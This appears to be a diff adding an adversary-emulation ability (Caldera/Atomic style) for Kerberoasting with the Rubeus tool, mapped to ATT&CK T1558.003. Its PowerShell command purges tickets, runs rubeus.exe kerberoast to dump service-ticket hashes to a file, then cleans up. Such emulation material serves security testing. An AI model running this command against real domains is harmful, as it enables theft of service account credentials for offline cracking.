@@ -1,0 +1,24 @@
+---
+- id: eedc7881da4d2fddb5c56fb96aaeecfd
+  name: Rubeus kerberoast
+  description: 'Information on the Rubeus tool and it''s creators found here: https://github.com/GhostPack/Rubeus#asreproast
+
+    This build targets .NET 4.5.  If targeting a different version you will need to
+    compile Rubeus
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
+  platforms:
+    windows:
+      psh:
+        command: klist purge; cmd.exe /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
+          kerberoast None /outfile:"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"
+        payloads: []
+        cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"
+          -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
